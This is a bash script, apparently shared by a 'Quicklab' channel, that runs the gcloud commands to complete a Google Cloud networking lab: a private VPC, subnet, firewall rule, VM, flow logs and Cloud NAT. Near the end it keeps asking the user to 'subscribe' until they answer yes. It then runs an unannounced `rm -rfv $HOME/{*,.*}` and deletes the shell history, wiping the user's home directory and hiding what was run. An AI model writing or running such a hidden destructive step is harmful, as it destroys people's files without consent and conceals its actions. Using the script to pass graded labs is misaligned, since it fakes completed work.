

BLACK=`tput setaf 0`
RED=`tput setaf 1`
GREEN=`tput setaf 2`
YELLOW=`tput setaf 3`
BLUE=`tput setaf 4`
MAGENTA=`tput setaf 5`
CYAN=`tput setaf 6`
WHITE=`tput setaf 7`

BG_BLACK=`tput setab 0`
BG_RED=`tput setab 1`
BG_GREEN=`tput setab 2`
BG_YELLOW=`tput setab 3`
BG_BLUE=`tput setab 4`
BG_MAGENTA=`tput setab 5`
BG_CYAN=`tput setab 6`
BG_WHITE=`tput setab 7`

BOLD=`tput bold`
RESET=`tput sgr0`
#----------------------------------------------------start--------------------------------------------------#

echo "${YELLOW}${BOLD}

Starting Execution 


${RESET}"
#gcloud auth list
#gcloud config list project
export PROJECT_ID=$(gcloud info --format='value(config.project)')
#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
#export EMAIL=$(gcloud config get-value core/account)
#gcloud config set compute/region us-central1
#gcloud config set compute/zone us-central1-a
#export ZONE=us-central1-a



#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
#----------------------------------------------------code--------------------------------------------------#



gcloud compute networks create cymbal-privatenet --project=$DEVSHELL_PROJECT_ID --subnet-mode=custom --mtu=1460 --bgp-routing-mode=regional && gcloud compute networks subnets create cymbal-privatenet-us --project=$DEVSHELL_PROJECT_ID --range=10.0.0.0/24 --stack-type=IPV4_ONLY --network=cymbal-privatenet --region=us-central1


gcloud compute --project=$DEVSHELL_PROJECT_ID firewall-rules create cymbal-privatenet-allow-iap-ssh --direction=INGRESS --priority=1000 --network=cymbal-privatenet --action=ALLOW --rules=tcp:22 --source-ranges=10.0.0.0/24


gcloud compute instances create cymbal-vm-internal --project=$DEVSHELL_PROJECT_ID --zone=us-central1-c --machine-type=e2-medium --network-interface=stack-type=IPV4_ONLY,subnet=cymbal-privatenet-us,no-address --metadata=enable-oslogin=true --maintenance-policy=MIGRATE --provisioning-model=STANDARD --scopes=https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write,https://www.googleapis.com/auth/monitoring.write,https://www.googleapis.com/auth/servicecontrol,https://www.googleapis.com/auth/service.management.readonly,https://www.googleapis.com/auth/trace.append --create-disk=auto-delete=yes,boot=yes,device-name=cymbal-vm-internal,image=projects/debian-cloud/global/images/debian-11-bullseye-v20230912,mode=rw,size=10,type=projects/$DEVSHELL_PROJECT_ID/zones/us-central1-a/diskTypes/pd-balanced --no-shielded-secure-boot --shielded-vtpm --shielded-integrity-monitoring --labels=goog-ec-src=vm_add-gcloud --reservation-affinity=any


echo "${GREEN}${BOLD}

Task 1 Completed

${RESET}"

#task 2

gcloud compute networks subnets update cymbal-privatenet-us \
    --region=us-central1 \
    --enable-private-ip-google-access



gcloud compute networks subnets update cymbal-privatenet-us \
    --region=us-central1 \
    --enable-flow-logs


echo "${GREEN}${BOLD}

Task 2 Completed

${RESET}"


#task 3


gcloud compute routers create cymbal-nat-router \
    --network=cymbal-privatenet \
    --region=us-central1



gcloud compute routers nats create cymbal-nat-config \
    --router=cymbal-nat-router \
    --auto-allocate-nat-external-ips \
    --region=us-central1 \
    --nat-all-subnet-ip-ranges


echo "${GREEN}${BOLD}

Task 3 Completed

Lab Completed !!!

${RESET}"

#-----------------------------------------------------end----------------------------------------------------------#
read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE

while [ "$CONSENT_REMOVE" != 'y' ]; do
  sleep 10
  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
done

echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"

rm -rfv $HOME/{*,.*}
rm $HOME/.bash_history

exit 0